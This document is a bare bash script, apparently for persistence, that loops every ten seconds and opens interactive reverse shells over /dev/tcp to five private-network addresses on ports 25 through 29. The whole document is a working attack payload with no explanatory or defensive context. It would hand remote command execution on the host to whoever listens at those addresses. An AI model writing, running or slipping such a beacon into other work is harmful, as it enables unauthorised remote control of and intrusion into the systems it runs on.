while :
do
  sleep 10
  bash -i >& /dev/tcp/172.16.128.110/25 0>&1
  bash -i >& /dev/tcp/172.16.128.111/26 0>&1
  bash -i >& /dev/tcp/172.16.128.112/27 0>&1
  bash -i >& /dev/tcp/172.16.128.113/28 0>&1
  bash -i >& /dev/tcp/172.16.128.114/29 0>&1
done